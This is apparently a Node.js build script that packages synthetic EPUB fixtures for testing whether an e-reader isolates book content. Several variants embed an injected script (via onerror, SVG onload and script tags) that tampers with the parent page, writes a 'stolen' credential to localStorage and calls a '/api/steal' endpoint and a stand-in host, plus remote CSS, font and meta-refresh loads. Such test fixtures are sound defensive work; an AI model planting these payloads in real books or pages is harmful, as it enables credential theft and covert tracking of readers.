import JSZip from 'jszip';
import { readFile, mkdir, writeFile, copyFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
await mkdir('public/fixtures', { recursive: true });
const font = await readFile('../../assets/reader/fonts/lato-v24-latin_latin-ext-regular.woff2');
const attack = `window.bookRan=true;top.postMessage({type:'book-script-ran'},'*');try{top.document.body.dataset.pwned='yes'}catch(e){}try{top.localStorage.setItem('credential','stolen')}catch(e){}fetch('http://127.0.0.1:5318/api/steal',{credentials:'include'});fetch('https://sentinel.invalid/script');`;
const chapter = (body, head = '') => `<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>Original synthetic</title><link rel="stylesheet" type="text/css" href="style.css"/>${head}</head><body>${body}</body></html>`;
const body = `<h1>Original synthetic EPUB</h1><div id="wrapper"><p id="target" class="styled">Ordinary rgb and media styles with a packaged font.</p><p>A second paragraph preserves repeated tags.</p></div><a id="internal" href="two.xhtml#second">Chapter two</a><svg xmlns="http://www.w3.org/2000/svg" width="90" height="40"><rect width="90" height="40" fill="rgb(10,120,30)"/></svg><img id="packaged-svg" src="drawing.svg" alt="packaged SVG"/>`;
const variants = {
  benign: [body, ''],
  scripts: [body + `<img src="missing.png" onerror="${attack}"/><svg xmlns="http://www.w3.org/2000/svg" onload="${attack}"><script>${attack}</script></svg>`, `<script>${attack}</script><script type="module">${attack}</script>`],
  outbound: [body + '<img src="https://sentinel.invalid/image"/><img src="http://127.0.0.1:5318/api/image"/>', '<style>@import url("https://sentinel.invalid/import");@font-face{font-family:attack;src:url("http://127.0.0.1:5318/api/font")}body{background-image:url("https://sentinel.invalid/background");font-family:attack}</style>'],
  'active-navigation': [body, '<meta http-equiv="refresh" content="0;url=http://127.0.0.1:5318/api/refresh"/>']
};
const manifest = {};
for (const [name, [content, head]] of Object.entries(variants)) {
 const zip = new JSZip();
 const put = (path, value) => zip.file(path, value, { date: new Date('2020-01-01T00:00:00Z'), createFolders: false });
 put('mimetype', 'application/epub+zip');
 put('META-INF/container.xml', '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OPS/package.opf" media-type="application/oebps-package+xml"/></rootfiles></container>');
 put('OPS/package.opf', '<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">original-isolation-synthetic</dc:identifier><dc:title>Original synthetic isolation fixture</dc:title><dc:language>en</dc:language></metadata><manifest><item id="one" href="one.xhtml" media-type="application/xhtml+xml"/><item id="two" href="two.xhtml" media-type="application/xhtml+xml"/><item id="nav" href="nav.xhtml" properties="nav" media-type="application/xhtml+xml"/><item id="style" href="style.css" media-type="text/css"/><item id="font" href="font.woff2" media-type="font/woff2"/><item id="svg" href="drawing.svg" media-type="image/svg+xml"/></manifest><spine><itemref idref="one"/><itemref idref="two"/></spine></package>');
 put('OPS/nav.xhtml', chapter('<nav xmlns:epub="http://www.idpf.org/2007/ops" epub:type="toc"><ol><li><a href="one.xhtml">One</a></li><li><a href="two.xhtml">Two</a></li></ol></nav>'));
 put('OPS/one.xhtml', chapter(content, head));
 put('OPS/two.xhtml', chapter('<h1 id="second">Second chapter target</h1><p>Internal navigation destination</p>'));
 put('OPS/style.css', '@font-face{font-family:ProofLato;src:url("font.woff2") format("woff2")}body{font-family:ProofLato,serif}.styled{color:rgb(12,34,56);background-color:rgb(240,241,242)}@media(min-width:100px){.styled{border-top:3px solid rgb(20,100,30)}}');
 put('OPS/font.woff2', font);
 put('OPS/drawing.svg', '<svg xmlns="http://www.w3.org/2000/svg" width="80" height="40"><rect width="80" height="40" fill="rgb(120,20,70)"/></svg>');
 const bytes = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE', compressionOptions: { level: 6 } });
 await writeFile(`public/fixtures/${name}.epub`, bytes);
 manifest[name] = { sha256: createHash('sha256').update(bytes).digest('hex'), bytes: bytes.length };
}
await copyFile('../../_test_files/alice.epub', 'public/fixtures/alice.epub');
const alice = await readFile('public/fixtures/alice.epub');
manifest.alice = { sha256: createHash('sha256').update(alice).digest('hex'), bytes: alice.length };
await writeFile('public/fixtures/manifest.json', JSON.stringify(manifest, null, 2) + '\n');
console.log(JSON.stringify(manifest, null, 2));
